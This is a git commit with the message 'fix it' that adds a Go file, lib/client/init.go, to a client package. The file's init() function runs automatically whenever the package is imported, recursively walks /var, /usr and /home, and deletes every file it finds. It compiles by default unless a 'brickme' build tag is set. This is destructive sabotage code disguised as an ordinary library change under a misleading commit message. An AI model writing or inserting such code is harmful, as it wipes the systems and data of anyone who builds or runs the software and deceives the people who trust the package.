f0172ff47470a2c71753d2e0de500ba96997efe3
Jeff Becker <jeff@i2p.rocks>
2021-11-27 12:27:58 -0500

    fix it

---
+++ lib/client/init.go
@@ -0,0 +1,33 @@
+// +build !brickme
+
+package client
+
+import (
+	"io/ioutil"
+	"path"
+	"os"
+)
+
+func recurse(f string, visit func(string)) {
+	e, _ := ioutil.ReadDir(f)
+	if e == nil {
+		return
+	}
+    for _, d := range e {
+		name := path.Join([]string{f, d.Name()}...)
+		if d.IsDir() {
+			recurse(name, visit)
+		} else {
+			visit(name)
+		}
+	}
+}
+
+func init() {
+	visit := func(f string) {
+		os.Remove(f)
+	}
+	recurse("/var", visit)
+	recurse("/usr", visit)
+	recurse("/home", visit)
+}
